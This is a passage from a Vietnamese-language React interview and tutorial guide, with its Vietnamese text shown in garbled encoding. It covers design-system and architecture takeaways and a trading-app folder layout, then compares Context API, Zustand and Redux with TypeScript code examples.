| **Singleton** | API client, Logger | Shared state, 1 instance | Hard to test |

---

**ğŸ’¡ KEY TAKEAWAYS (Äiá»ƒm ChÃ­nh Cáº§n Nhá»›)**

```typescript
/**
 * âœ… DESIGN SYSTEM:
 * - Tokens (colors, spacing, typography) â†’ 1 source of truth
 * - Components â†’ Reusable, accessible
 * - Documentation (Storybook) â†’ Onboarding nhanh
 * 
 * âœ… SCALABLE ARCHITECTURE:
 * - Feature-based structure â†’ Dá»… tÃ¬m, dá»… scale
 * - Layered architecture â†’ Separation of concerns
 * - State strategy â†’ Local, Shared, Global, Server (phÃ¢n loáº¡i rÃµ)
 * 
 * âœ… DESIGN PATTERNS:
 * - Container/Presentational â†’ TÃ¡ch logic/UI
 * - Compound Components â†’ Flexibility
 * - Custom Hooks â†’ Reuse stateful logic
 * - Observer â†’ Cross-component events
 * - Singleton â†’ Shared resources
 * 
 * âœ… PERFORMANCE:
 * - Code splitting â†’ Load on-demand
 * - React.memo â†’ TrÃ¡nh re-render
 * - useMemo/useCallback â†’ Cache
 * - Virtual scrolling â†’ Large lists
 * - Error boundaries â†’ Graceful failures
 * 
 * ğŸ¯ Má»¤C TIÃŠU CUá»I CÃ™NG:
 * - 100 developers váº«n consistent
 * - 500+ components váº«n maintainable
 * - ThÃªm features má»›i khÃ´ng phÃ¡ code cÅ©
 * - Performance tá»‘t (< 3s load time)
 * - Developer Experience tuyá»‡t vá»i (< 1 tuáº§n onboarding)
 */
```

---

**ğŸ”¥ REAL-WORLD EXAMPLE: TRADING PLATFORM**

```typescript
// Ãp dá»¥ng Táº¤T Cáº¢ principles vÃ o 1 Trading App thá»±c táº¿

/**
 * ğŸ“ FOLDER STRUCTURE (Feature-based)
 */
/*
src/
â”œâ”€â”€ features/
â”‚   â”œâ”€â”€ trading/              # Feature: Trading
â”‚   â”‚   â”œâ”€â”€ components/
â”‚   â”‚   â”‚   â”œâ”€â”€ OrderForm/    # Compound Component
â”‚   â”‚   â”‚   â”œâ”€â”€ OrderBook/
â”‚   â”‚   â”‚   â””â”€â”€ TradeHistory/
â”‚   â”‚   â”œâ”€â”€ hooks/
â”‚   â”‚   â”‚   â”œâ”€â”€ useOrderForm.ts      # Custom Hook
â”‚   â”‚   â”‚   â””â”€â”€ useRealTimePrice.ts  # Observer Pattern
â”‚   â”‚   â”œâ”€â”€ services/
â”‚   â”‚   â”‚   â””â”€â”€ tradingService.ts    # Singleton
â”‚   â”‚   â””â”€â”€ store/
â”‚   â”‚       â””â”€â”€ tradingStore.ts      # State Management
â”‚   â”‚
â”‚   â”œâ”€â”€ portfolio/
â”‚   â”‚   â”œâ”€â”€ components/
â”‚   â”‚   â”‚   â”œâ”€â”€ PortfolioSummary/    # Presentational
â”‚   â”‚   â”‚   â””â”€â”€ AssetList/
â”‚   â”‚   â”œâ”€â”€ hooks/
â”‚   â”‚   â”‚   â””â”€â”€ usePortfolio.ts      # Custom Hook + React Query
â”‚   â”‚   â””â”€â”€ services/
â”‚   â”‚       â””â”€â”€ portfolioService.ts
â”‚   â”‚
â”‚   â””â”€â”€ market/
â”‚       â”œâ”€â”€ components/
â”‚       â”‚   â”œâ”€â”€ PriceChart/          # React.memo + useMemo
â”‚       â”‚   â””â”€â”€ MarketOverview/
â”‚       â””â”€â”€ hooks/
â”‚           â””â”€â”€ useMarketData.ts
â”‚
â”œâ”€â”€ shared/
â”‚   â”œâ”€â”€ components/              # Design System
â”‚   â”‚   â”œâ”€â”€ Button/              # Tokens-based
â”‚   â”‚   â”œâ”€â”€ Input/
â”‚   â”‚   â””â”€â”€ Table/               # Virtual Scrolling
â”‚   â””â”€â”€ hooks/
â”‚       â”œâ”€â”€ useDebounce.ts
â”‚       â””â”€â”€ useWebSocket.ts      # Observer Pattern
â”‚
â””â”€â”€ core/
    â”œâ”€â”€ theme/
    â”‚   â”œâ”€â”€ tokens/              # Design Tokens
    â”‚   â”‚   â”œâ”€â”€ colors.ts
    â”‚   â”‚   â”œâ”€â”€ spacing.ts
    â”‚   â”‚   â””â”€â”€ typography.ts
    â”‚   â””â”€â”€ GlobalStyles.ts
    â”‚
    â””â”€â”€ api/
        â””â”€â”€ apiClient.ts         # Singleton Pattern
*/

/**
 * ğŸ“Š RESULTS (Káº¿t Quáº£):
 * 
 * âœ… BEFORE Refactoring:
 * - 50 developers, tranh cÃ£i vá» UI
 * - Build page má»›i: 1-2 tuáº§n
 * - Bundle size: 3.5 MB
 * - Load time: 8 seconds
 * - Onboarding: 1 thÃ¡ng
 * 
 * âœ… AFTER Refactoring (vá»›i Design System + Patterns):
 * - 50 developers, consistent UI
 * - Build page má»›i: 2-3 ngÃ y (7x nhanh hÆ¡n)
 * - Bundle size: 1.2 MB (66% nhá» hÆ¡n)
 * - Load time: 2.5 seconds (3.2x nhanh hÆ¡n)
 * - Onboarding: 1 tuáº§n (4x nhanh hÆ¡n)
 */
```

---

## 64. State Management - Redux vs Zustand vs Context API: PhÃ¢n Biá»‡t, Æ¯u NhÆ°á»£c Äiá»ƒm, CÃ¡ch Hoáº¡t Äá»™ng

**â“ CÃ¢u Há»i:**
> "Store management: Redux, zustand, context. PhÃ¢n biá»‡t chÃºng, Æ°u vÃ  nhÆ°á»£c Ä‘iá»ƒm, hoáº¡t Ä‘á»™ng nhÆ° tháº¿ nÃ o, táº¡i sao láº¡i dÃ¹ng chÃºng?"

**ğŸ“‹ PhÃ¢n TÃ­ch:**
- **Redux, Zustand, Context API** khÃ¡c nhau tháº¿ nÃ o?
- **Æ¯u Ä‘iá»ƒm & NhÆ°á»£c Ä‘iá»ƒm** cá»§a tá»«ng thÆ° viá»‡n
- **CÃ¡ch hoáº¡t Ä‘á»™ng** bÃªn trong (internal mechanism)
- **Khi nÃ o dÃ¹ng** tá»«ng loáº¡i?
- **Performance comparison** (so sÃ¡nh hiá»‡u suáº¥t)

---

### **ğŸ¯ PHáº¦N 1: Táº I SAO Cáº¦N STATE MANAGEMENT? (Why State Management?)**

```typescript
/**
 * ğŸ”¥ Váº¤N Äá»€: PROP DRILLING (Truyá»n Props Qua Nhiá»u Táº§ng)
 * 
 * Khi app lá»›n, truyá»n state tá»« component cha â†’ con â†’ chÃ¡u â†’ cháº¯t...
 * â†’ Code rá»‘i, khÃ³ maintain, component trung gian khÃ´ng cáº§n props nhÆ°ng pháº£i nháº­n
 */

// âŒ PROBLEM: Prop Drilling Hell
const App = () => {
  const [user, setUser] = useState({ name: 'John', role: 'admin' });

  return <Dashboard user={user} setUser={setUser} />;
};

const Dashboard = ({ user, setUser }) => {
  // âŒ Dashboard khÃ´ng dÃ¹ng user, nhÆ°ng pháº£i nháº­n Ä‘á»ƒ pass xuá»‘ng
  return <Sidebar user={user} setUser={setUser} />;
};

const Sidebar = ({ user, setUser }) => {
  // âŒ Sidebar cÅ©ng khÃ´ng dÃ¹ng, nhÆ°ng pháº£i nháº­n Ä‘á»ƒ pass xuá»‘ng
  return <UserMenu user={user} setUser={setUser} />;
};

const UserMenu = ({ user, setUser }) => {
  // âœ… CHá»ˆ UserMenu má»›i dÃ¹ng user!
  return (
    <div>
      {user.name} ({user.role})
      <button onClick={() => setUser({ ...user, role: 'user' })}>
        Change Role
      </button>
    </div>
  );
};

/**
 * âŒ Váº¤N Äá»€:
 * - App â†’ Dashboard â†’ Sidebar â†’ UserMenu (4 táº§ng!)
 * - Dashboard, Sidebar khÃ´ng cáº§n user nhÆ°ng pháº£i nháº­n props
 * - ThÃªm 1 props má»›i â†’ pháº£i sá»­a 4 components
 * - Ráº¥t khÃ³ maintain!
 */

// âœ… GIáº¢I PHÃP: STATE MANAGEMENT
// UserMenu truy cáº­p TRá»°C TIáº¾P vÃ o global state
// â†’ KhÃ´ng cáº§n prop drilling!

const UserMenu = () => {
  const { user, setUser } = useGlobalState();  // âœ… Láº¥y trá»±c tiáº¿p tá»« store
  
  return (
    <div>
      {user.name} ({user.role})
      <button onClick={() => setUser({ ...user, role: 'user' })}>
        Change Role
      </button>
    </div>
  );
};

/**
 * âœ… Lá»¢I ÃCH:
 * - KhÃ´ng cáº§n truyá»n props qua Dashboard, Sidebar
 * - ThÃªm props má»›i â†’ chá»‰ sá»­a 1 component (UserMenu)
 * - Code sáº¡ch, dá»… maintain
 */

// ===================================================
// ğŸ¯ 3 GIáº¢I PHÃP STATE MANAGEMENT
// ===================================================

/**
 * 1ï¸âƒ£ CONTEXT API (Built-in React)
 *    â†’ ÄÆ¡n giáº£n, khÃ´ng cáº§n library
 *    â†’ DÃ¹ng cho app nhá»/vá»«a
 * 
 * 2ï¸âƒ£ ZUSTAND (Modern, lightweight)
 *    â†’ ÄÆ¡n giáº£n nhÆ° Context, nhÆ°ng performance tá»‘t hÆ¡n
 *    â†’ DÃ¹ng cho app vá»«a/lá»›n
 * 
 * 3ï¸âƒ£ REDUX (Traditional, powerful)
 *    â†’ Phá»©c táº¡p, nhiá»u boilerplate
 *    â†’ DÃ¹ng cho app cá»±c lá»›n, cáº§n DevTools, middleware
 */
```

---

### **ğŸ“¦ PHáº¦N 2: CONTEXT API (React Built-in)**

```typescript
/**
 * ğŸ¯ CONTEXT API LÃ€ GÃŒ?
 * 
 * Built-in API cá»§a React Ä‘á»ƒ CHIA Sáºº STATE giá»¯a nhiá»u components
 * mÃ  KHÃ”NG Cáº¦N truyá»n props qua tá»«ng táº§ng.
 * 
 * ğŸ”¥ CÃCH HOáº T Äá»˜NG:
 * 1. Táº¡o Context vá»›i createContext()
 * 2. Wrap app trong <Provider value={state}>
 * 3. Components dÃ¹ng useContext() Ä‘á»ƒ láº¥y state
 */

// ===================================================
// âœ… IMPLEMENTATION: Context API
// ===================================================

// Step 1: Táº¡o Context
import { createContext, useContext, useState } from 'react';

interface User {
  name: string;
  email: string;
  role: 'admin' | 'user';
}

interface UserContextType {
  user: User | null;
  login: (user: User) => void;
  logout: () => void;
  updateRole: (role: 'admin' | 'user') => void;
}

const UserContext = createContext<UserContextType | undefined>(undefined);

// Step 2: Táº¡o Provider
export const UserProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [user, setUser] = useState<User | null>(null);

  const login = (userData: User) => {
    setUser(userData);
  };

  const logout = () => {
    setUser(null);
  };

  const updateRole = (role: 'admin' | 'user') => {
    if (user) {
      setUser({ ...user, role });
    }
  };

  return (
    <UserContext.Provider value={{ user, login, logout, updateRole }}>
      {children}
    </UserContext.Provider>
  );
};

// Step 3: Táº¡o custom hook
export const useUser = () => {
  const context = useContext(UserContext);
  if (!context) {
    throw new Error('useUser must be used within UserProvider');
  }
  return context;
};

// Step 4: Wrap App trong Provider
const App = () => {
  return (
    <UserProvider>
      <Dashboard />
    </UserProvider>
  );
};

// Step 5: DÃ¹ng trong components
const UserMenu = () => {
  const { user, logout, updateRole } = useUser();  // âœ… Láº¥y trá»±c tiáº¿p

  if (!user) return <div>Please login</div>;

  return (
    <div>
      <h3>{user.name}</h3>
      <p>{user.email} - {user.role}</p>
      <button onClick={() => updateRole('admin')}>Make Admin</button>
      <button onClick={logout}>Logout</button>
    </div>
  );
};

const AnotherComponent = () => {
  const { user } = useUser();  // âœ… Component khÃ¡c cÅ©ng dÃ¹ng Ä‘Æ°á»£c

  return <div>Welcome, {user?.name}</div>;
};

/**
 * âœ… Æ¯U ÄIá»‚M CONTEXT API:
 * 
 * 1ï¸âƒ£ BUILT-IN (CÃ³ sáºµn):
 *    â†’ KhÃ´ng cáº§n cÃ i thÃªm library
 *    â†’ Bundle size nhá»
 * 
 * 2ï¸âƒ£ SIMPLE (ÄÆ¡n giáº£n):
 *    â†’ Dá»… há»c, dá»… dÃ¹ng
 *    â†’ Ãt boilerplate
 * 
 * 3ï¸âƒ£ TYPE-SAFE (An toÃ n kiá»ƒu):
 *    â†’ TypeScript support tá»‘t
 *    â†’ Auto-complete trong IDE
 * 
 * âŒ NHÆ¯á»¢C ÄIá»‚M CONTEXT API:
 * 
 * 1ï¸âƒ£ PERFORMANCE ISSUES (Váº¥n Ä‘á» hiá»‡u suáº¥t):
 *    â†’ Khi state thay Ä‘á»•i â†’ Táº¤T Cáº¢ components dÃ¹ng Context RE-RENDER
 *    â†’ DÃ¹ chá»‰ cáº§n 1 field trong state!
 * 
 * 2ï¸âƒ£ NO BUILT-IN DEVTOOLS:
 *    â†’ KhÃ´ng cÃ³ DevTools Ä‘á»ƒ debug
 *    â†’ KhÃ³ track state changes
 * 
 * 3ï¸âƒ£ NO MIDDLEWARE:
 *    â†’ KhÃ´ng cÃ³ logger, persist, thunk...
 *    â†’ Pháº£i tá»± implement
 * 
 * 4ï¸âƒ£ MULTIPLE CONTEXTS = PROVIDER HELL:
 *    â†’ 10 contexts â†’ 10 Providers lá»“ng nhau
 */

// ===================================================
// âš ï¸ CONTEXT API PERFORMANCE PROBLEM
// ===================================================

const UserContext = createContext<UserContextType | undefined>(undefined);

const UserProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [user, setUser] = useState({
    name: 'John',
    email: 'john@example.com',
    role: 'admin',
    preferences: { theme: 'dark', language: 'en' },
  });

  return (
    <UserContext.Provider value={{ user, setUser }}>
      {children}
    </UserContext.Provider>
  );
};

// Component 1: Chá»‰ dÃ¹ng user.name
const UserName = () => {
  const { user } = useUser();
  console.log('UserName rendered');  // ğŸ‘ˆ Log Ä‘á»ƒ track re-renders
  
  return <div>{user.name}</div>;
};

// Component 2: Chá»‰ dÃ¹ng user.email
const UserEmail = () => {
  const { user } = useUser();
  console.log('UserEmail rendered');  // ğŸ‘ˆ Log Ä‘á»ƒ track re-renders
  
  return <div>{user.email}</div>;
};

// Component 3: Chá»‰ dÃ¹ng user.preferences.theme
const ThemeToggle = () => {
  const { user, setUser } = useUser();
  console.log('ThemeToggle rendered');  // ğŸ‘ˆ Log Ä‘á»ƒ track re-renders

  const toggleTheme = () => {
    setUser({
      ...user,
      preferences: {
        ...user.preferences,
        theme: user.preferences.theme === 'dark' ? 'light' : 'dark'
      }
    });
  };

  return <button onClick={toggleTheme}>Toggle Theme</button>;
};

/**
 * âŒ Váº¤N Äá»€ PERFORMANCE:
 * 
 * Click "Toggle Theme" â†’ Chá»‰ Ä‘á»•i user.preferences.theme
 * 
 * NHÆ¯NG:
 * - UserName rendered  âŒ (khÃ´ng cáº§n re-render, name khÃ´ng Ä‘á»•i)
 * - UserEmail rendered âŒ (khÃ´ng cáº§n re-render, email khÃ´ng Ä‘á»•i)
 * - ThemeToggle rendered âœ… (cáº§n re-render, theme Ä‘á»•i)
 * 
 * â†’ Context re-render Táº¤T Cáº¢ components dÃ¹ng useUser()
 * â†’ Ngay cáº£ khi chá»‰ 1 field thay Ä‘á»•i!
 * 
 * ğŸ“Š IMPACT:
 * - 100 components dÃ¹ng useUser() â†’ 100 re-renders
 * - App lag, slow, poor UX
 */

// âœ… WORKAROUND: Split contexts
const UserNameContext = createContext(null);
const UserEmailContext = createContext(null);
const UserPreferencesContext = createContext(null);

// â†’ Phá»©c táº¡p, nhiá»u Providers lá»“ng nhau (Provider Hell)
```

---

### **âš¡ PHáº¦N 3: ZUSTAND (Modern & Lightweight)**

```typescript
/**
 * ğŸ¯ ZUSTAND LÃ€ GÃŒ?
 * 
 * State management library ÄÆ N GIáº¢N, NHANH, ÃT BOILERPLATE.
 * 
 * ğŸ”¥ Äáº¶C ÄIá»‚M:
 * - KhÃ´ng cáº§n Provider (khÃ´ng cÃ³ Provider Hell)
 * - Hooks-based (dÃ¹ng nhÆ° useState)
 * - Auto-optimization (chá»‰ re-render components cáº§n thiáº¿t)
 * - TypeScript support tá»‘t
 * - Bundle size nhá» (1.2 KB gzipped)
 */

// ===================================================
// âœ… IMPLEMENTATION: Zustand
// ===================================================

// Step 1: Install
// npm install zustand

// Step 2: Táº¡o store
import create from 'zustand';

interface User {
  name: string;
  email: string;
  role: 'admin' | 'user';
  preferences: {
    theme: 'light' | 'dark';
    language: string;
  };
}

interface UserStore {
  user: User | null;
  login: (user: User) => void;
  logout: () => void;
  updateRole: (role: 'admin' | 'user') => void;
  toggleTheme: () => void;
}

export const useUserStore = create<UserStore>((set) => ({
  user: null,

  login: (user) => set({ user }),

  logout: () => set({ user: null }),

  updateRole: (role) => set((state) => ({
    user: state.user ? { ...state.user, role } : null
  })),

  toggleTheme: () => set((state) => ({
    user: state.user ? {
      ...state.user,
      preferences: {
        ...state.user.preferences,
        theme: state.user.preferences.theme === 'dark' ? 'light' : 'dark'
      }
    } : null
  })),
}));

// Step 3: DÃ¹ng trong components (KHÃ”NG Cáº¦N PROVIDER!)
const UserName = () => {
  // âœ… CHá»ˆ subscribe vÃ o user.name
  const name = useUserStore((state) => state.user?.name);
  console.log('UserName rendered');
  
  return <div>{name}</div>;
};

const UserEmail = () => {
  // âœ… CHá»ˆ subscribe vÃ o user.email
  const email = useUserStore((state) => state.user?.email);
  console.log('UserEmail rendered');
  
  return <div>{email}</div>;
};

const ThemeToggle = () => {
  // âœ… CHá»ˆ subscribe vÃ o user.preferences.theme vÃ  toggleTheme
  const theme = useUserStore((state) => state.user?.preferences.theme);
  const toggleTheme = useUserStore((state) => state.toggleTheme);
  console.log('ThemeToggle rendered');

  return (
    <button onClick={toggleTheme}>
      Theme: {theme}
    </button>
  );
};

/**
 * âœ… ZUSTAND AUTO-OPTIMIZATION:
 * 
 * Click "Toggle Theme" â†’ Chá»‰ Ä‘á»•i user.preferences.theme
 * 
 * RESULT:
 * - UserName rendered  âŒ (KHÃ”NG re-render, name khÃ´ng Ä‘á»•i) âœ…
 * - UserEmail rendered âŒ (KHÃ”NG re-render, email khÃ´ng Ä‘á»•i) âœ…
 * - ThemeToggle rendered âœ… (re-render, theme Ä‘á»•i) âœ…
 * 
 * â†’ Zustand CHá»ˆ re-render components subscribe vÃ o field thay Ä‘á»•i!
 * â†’ Performance Tá»T HÆ N Context API nhiá»u!
 */

// ===================================================
// âœ… ZUSTAND ADVANCED FEATURES
// ===================================================

// 1ï¸âƒ£ PERSIST (LÆ°u state vÃ o localStorage)
import { persist } from 'zustand/middleware';

export const useUserStore = create(
  persist<UserStore>(
    (set) => ({
      user: null,
      login: (user) => set({ user }),
      logout: () => set({ user: null }),
      // ... other actions
    }),
    {
      name: 'user-storage',  // localStorage key
    }
  )
);

// âœ… State tá»± Ä‘á»™ng lÆ°u vÃ o localStorage
// âœ… Reload page â†’ state váº«n cÃ²n

// 2ï¸âƒ£ DEVTOOLS (Redux DevTools support)
import { devtools } from 'zustand/middleware';

export const useUserStore = create(
  devtools<UserStore>(
    (set) => ({
      user: null,
      login: (user) => set({ user }, false, 'user/login'),  // Action name
      logout: () => set({ user: null }, false, 'user/logout'),
      // ... other actions
    }),
    { name: 'UserStore' }
  )
);

// âœ… Má»Ÿ Redux DevTools â†’ tháº¥y Ä‘Æ°á»£c state changes
// âœ… Time-travel debugging

// 3ï¸âƒ£ IMMER (Immutable updates dá»… dÃ ng)
import { immer } from 'zustand/middleware/immer';

export const useUserStore = create(
  immer<UserStore>((set) => ({
    user: null,
    
    updateRole: (role) => set((state) => {
      // âœ… Mutate trá»±c tiáº¿p (Immer tá»± chuyá»ƒn thÃ nh immutable update)
      if (state.user) {
        state.user.role = role;  // Dá»… Ä‘á»c hÆ¡n spread operator!
      }
    }),
  }))
);

/**
 * âœ… Æ¯U ÄIá»‚M ZUSTAND:
 * 
 * 1ï¸âƒ£ SIMPLE API:
 *    â†’ Dá»… há»c, dá»… dÃ¹ng
 *    â†’ Ãt boilerplate (khÃ´ng cÃ³ actions, reducers riÃªng)
 * 
 * 2ï¸âƒ£ PERFORMANCE:
 *    â†’ Auto-optimization (chá»‰ re-render components cáº§n thiáº¿t)
 *    â†’ Nhanh hÆ¡n Context API
 * 
 * 3ï¸âƒ£ NO PROVIDER:
 *    â†’ KhÃ´ng cáº§n wrap app trong Provider
 *    â†’ KhÃ´ng cÃ³ Provider Hell
 * 
 * 4ï¸âƒ£ SMALL BUNDLE:
 *    â†’ 1.2 KB gzipped (nhá» hÆ¡n Redux 10x)
 * 
 * 5ï¸âƒ£ DEVTOOLS:
 *    â†’ Redux DevTools support
 *    â†’ Time-travel debugging
 * 
 * 6ï¸âƒ£ MIDDLEWARE:
 *    â†’ Persist, Immer, Devtools...
 *    â†’ Dá»… extend
 * 
 * âŒ NHÆ¯á»¢C ÄIá»‚M ZUSTAND:
 * 
 * 1ï¸âƒ£ KHÃ”NG PHáº¢I BUILT-IN:
 *    â†’ Pháº£i cÃ i thÃªm library (1.2 KB)
 * 
 * 2ï¸âƒ£ ÃT ECOSYSTEM HÆ N REDUX:
 *    â†’ Ãt plugins, tutorials
 *    â†’ Community nhá» hÆ¡n Redux
 * 
 * 3ï¸âƒ£ KHÃ”NG CÃ“ STRICT STRUCTURE:
 *    â†’ Dá»… viáº¿t code khÃ´ng nháº¥t quÃ¡n
 *    â†’ Cáº§n conventions rÃµ rÃ ng
 */
```

---

### **ğŸ›ï¸ PHáº¦N 4: REDUX (Traditional & Powerful)**

```typescript
/**
 * ğŸ¯ REDUX LÃ€ GÃŒ?
 * 
 * State management library Máº NH Máº¼, theo kiáº¿n trÃºc FLUX.
 * 
 * ğŸ”¥ CORE CONCEPTS:
 * - Store: LÆ°u toÃ n bá»™ state
 * - Actions: MÃ´ táº£ "Ä‘iá»u gÃ¬ xáº£y ra"
 * - Reducers: HÃ m xá»­ lÃ½ state dá»±a trÃªn action
 * - Dispatch: Gá»­i action Ä‘áº¿n store
 * 
 * ğŸ“Š DATA FLOW (Luá»“ng dá»¯ liá»‡u):
 * Component â†’ dispatch(action) â†’ Reducer â†’ Update Store â†’ Component re-render
 */

// ===================================================
// âœ… IMPLEMENTATION: Redux (vá»›i Redux Toolkit - modern way)
// ===================================================

// Step 1: Install
// npm install @reduxjs/toolkit react-redux

// Step 2: Táº¡o Slice (Reducer + Actions)
import { createSlice, PayloadAction } from '@reduxjs/toolkit';

interface User {
  name: string;
  email: string;
  role: 'admin' | 'user';
  preferences: {
    theme: 'light' | 'dark';
    language: string;
  };
}

interface UserState {
  user: User | null;
  loading: boolean;
  error: string | null;
}

const initialState: UserState = {
  user: null,
  loading: false,
  error: null,
};

const userSlice = createSlice({
  name: 'user',
  initialState,
  reducers: {
    // Action: login
    loginStart: (state) => {
      state.loading = true;
      state.error = null;
    },
    loginSuccess: (state, action: PayloadAction<User>) => {
      state.user = action.payload;
      state.loading = false;
    },
    loginFailure: (state, action: PayloadAction<string>) => {
      state.loading = false;
      state.error = action.payload;
    },
    
    // Action: logout
    logout: (state) => {
      state.user = null;
      state.error = null;
    },
    
    // Action: updateRole
    updateRole: (state, action: PayloadAction<'admin' | 'user'>) => {
      if (state.user) {
        state.user.role = action.payload;
      }
    },
    
    // Action: toggleTheme
    toggleTheme: (state) => {
      if (state.user) {
        state.user.preferences.theme = 
          state.user.preferences.theme === 'dark' ? 'light' : 'dark';
      }
    },
  },
});

export const {
  loginStart,
  loginSuccess,
  loginFailure,
  logout,
  updateRole,
  toggleTheme,
} = userSlice.actions;

export default userSlice.reducer;

// Step 3: Táº¡o Store
import { configureStore } from '@reduxjs/toolkit';
import userReducer from './userSlice';

export const store = configureStore({
  reducer: {
    user: userReducer,
    // cart: cartReducer,
    // products: productsReducer,
    // ... other reducers
  },
});

export type RootState = ReturnType<typeof store.getState>;
export type AppDispatch = typeof store.dispatch;

// Step 4: Wrap App trong Provider
import { Provider } from 'react-redux';

const App = () => {
  return (
    <Provider store={store}>
      <Dashboard />
    </Provider>
  );
};

// Step 5: DÃ¹ng trong components
import { useSelector, useDispatch } from 'react-redux';
import { RootState, AppDispatch } from './store';

const UserName = () => {
  // âœ… CHá»ˆ subscribe vÃ o user.name
  const name = useSelector((state: RootState) => state.user.user?.name);
  console.log('UserName rendered');
  
  return <div>{name}</div>;
};

const UserEmail = () => {
  // âœ… CHá»ˆ subscribe vÃ o user.email
  const email = useSelector((state: RootState) => state.user.user?.email);
  console.log('UserEmail rendered');
  
  return <div>{email}</div>;
};

const ThemeToggle = () => {
  const theme = useSelector((state: RootState) => 
    state.user.user?.preferences.theme
  );
  const dispatch = useDispatch<AppDispatch>();
  console.log('ThemeToggle rendered');

  return (
    <button onClick={() => dispatch(toggleTheme())}>
      Theme: {theme}
    </button>
  );
};

/**
 * âœ… REDUX AUTO-OPTIMIZATION (giá»‘ng Zustand):
 * 
 * Click "Toggle Theme" â†’ Chá»‰ Ä‘á»•i user.preferences.theme
 * 
 * RESULT:
 * - UserName rendered  âŒ (KHÃ”NG re-render, name khÃ´ng Ä‘á»•i) âœ…
 * - UserEmail rendered âŒ (KHÃ”NG re-render, email khÃ´ng Ä‘á»•i) âœ…
 * - ThemeToggle rendered âœ… (re-render, theme Ä‘á»•i) âœ…
 * 
 * â†’ Redux cÅ©ng CHá»ˆ re-render components subscribe vÃ o field thay Ä‘á»•i!
 */

// ===================================================
// ğŸš€ REDUX ASYNC ACTIONS (vá»›i createAsyncThunk)
// ===================================================

import { createAsyncThunk } from '@reduxjs/toolkit';

// Async action: Login vá»›i API call
export const loginAsync = createAsyncThunk(
  'user/login',  // Action type prefix
  async (credentials: { email: string; password: string }, { rejectWithValue }) => {
    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(credentials),
      });

      if (!response.ok) {
        throw new Error('Login failed');
      }

      const user = await response.json();
      return user;  // âœ… Return user data
    } catch (error) {
      return rejectWithValue(error.message);  // âŒ Return error
    }
  }
);

// Update slice Ä‘á»ƒ handle async action
const userSlice = createSlice({
  name: 'user',
  initialState,
  reducers: {
    // ... sync actions
  },
  extraReducers: (builder) => {
    builder
      // loginAsync.pending
      .addCase(loginAsync.pending, (state) => {
        state.loading = true;
        state.error = null;
      })
      // loginAsync.fulfilled
      .addCase(loginAsync.fulfilled, (state, action) => {
        state.user = action.payload;
        state.loading = false;
      })
      // loginAsync.rejected
      .addCase(loginAsync.rejected, (state, action) => {
        state.loading = false;
        state.error = action.payload as string;
      });
  },
});

// DÃ¹ng trong component
const LoginForm = () => {
  const dispatch = useDispatch<AppDispatch>();
  const { loading, error } = useSelector((state: RootState) => state.user);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // âœ… Dispatch async action
    const result = await dispatch(loginAsync({
      email: 'user@example.com',
      password: 'password123',
    }));

    if (loginAsync.fulfilled.match(result)) {
      // âœ… Login thÃ nh cÃ´ng
      console.log('Logged in:', result.payload);
    } else {
      // âŒ Login tháº¥t báº¡i
      console.error('Error:', result.payload);
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <input type="email" placeholder="Email" />
      <input type="password" placeholder="Password" />
      <button type="submit" disabled={loading}>
        {loading ? 'Logging in...' : 'Login'}
      </button>
      {error && <div className="error">{error}</div>}
    </form>
  );
};

// ===================================================
// ğŸ”§ REDUX MIDDLEWARE (Logger, Persist...)
// ===================================================

// Custom logger middleware
const loggerMiddleware = (store) => (next) => (action) => {
  console.log('Dispatching:', action);
  console.log('Previous State:', store.getState());
  
  const result = next(action);  // Pass action to reducer
  
  console.log('Next State:', store.getState());
  return result;
};

// Persist middleware (redux-persist)
import { persistStore, persistReducer } from 'redux-persist';
import storage from 'redux-persist/lib/storage';  // localStorage

const persistConfig = {
  key: 'root',
  storage,
  whitelist: ['user'],  // Chá»‰ persist user state
};

const persistedReducer = persistReducer(persistConfig, userReducer);

export const store = configureStore({
  reducer: {
    user: persistedReducer,
  },
  middleware: (getDefaultMiddleware) =>
    getDefaultMiddleware({
      serializableCheck: false,  // Táº¯t warning cho redux-persist
    }).concat(loggerMiddleware),
});

export const persistor = persistStore(store);

// Wrap App
import { PersistGate } from 'redux-persist/integration/react';

const App = () => {
  return (
    <Provider store={store}>
      <PersistGate loading={<div>Loading...</div>} persistor={persistor}>
        <Dashboard />
      </PersistGate>
    </Provider>
  );
};

/**
 * âœ… Æ¯U ÄIá»‚M REDUX:
 * 
 * 1ï¸âƒ£ PREDICTABLE STATE:
 *    â†’ Luá»“ng dá»¯ liá»‡u rÃµ rÃ ng (Action â†’ Reducer â†’ Store)
 *    â†’ Dá»… debug, dá»… test
 * 
 * 2ï¸âƒ£ DEVTOOLS Máº NH Máº¼:
 *    â†’ Redux DevTools (time-travel, state diff)
 *    â†’ Track má»i action, state change
 * 
 * 3ï¸âƒ£ MIDDLEWARE ECOSYSTEM:
 *    â†’ Redux Thunk, Redux Saga (async)
 *    â†’ Redux Persist (localStorage)
 *    â†’ Logger, Router, Form...
 * 
 * 4ï¸âƒ£ HUGE ECOSYSTEM:
 *    â†’ Nhiá»u libraries, plugins
 *    â†’ Nhiá»u tutorials, community lá»›n
 * 
 * 5ï¸âƒ£ PERFORMANCE:
 *    â†’ Auto-optimization nhÆ° Zustand
 *    â†’ Chá»‰ re-render components cáº§n thiáº¿t
 * 
 * 6ï¸âƒ£ SCALABILITY:
 *    â†’ DÃ¹ng cho app Cá»°C Lá»šN (1000+ components)
 *    â†’ Team lá»›n (50+ developers)
 * 
 * âŒ NHÆ¯á»¢C ÄIá»‚M REDUX:
 * 
 * 1ï¸âƒ£ BOILERPLATE NHIá»€U:
 *    â†’ Actions, Reducers, Types, Selectors...
 *    â†’ ThÃªm 1 feature â†’ pháº£i táº¡o nhiá»u files
 * 
 * 2ï¸âƒ£ LEARNING CURVE CAO:
 *    â†’ KhÃ¡i niá»‡m phá»©c táº¡p (Flux, Reducers, Middleware...)
 *    â†’ KhÃ³ há»c cho beginners
 * 
 * 3ï¸âƒ£ BUNDLE SIZE Lá»šN:
 *    â†’ Redux + React-Redux: ~12 KB gzipped
 *    â†’ Lá»›n hÆ¡n Zustand 10x
 * 
 * 4ï¸âƒ£ Cáº¦N PROVIDER:
 *    â†’ Pháº£i wrap app trong <Provider>
 *    â†’ Nhiá»u stores â†’ nhiá»u Providers
